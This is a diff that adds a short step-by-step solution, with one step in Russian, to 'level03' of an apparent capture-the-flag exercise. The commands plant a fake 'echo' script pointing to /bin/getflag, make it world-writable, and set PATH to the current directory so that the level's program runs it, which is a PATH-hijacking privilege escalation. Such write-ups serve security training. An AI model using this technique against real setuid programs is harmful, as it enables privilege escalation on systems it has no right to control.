@@ -1,0 +1,7 @@
+1. strings level03
+2. chmod 777 .
+3. создать файл через vim echo
+	#!/bin/getflag
+4. chmod 777 echo
+5. export PATH=$(pwd)
+6. level03
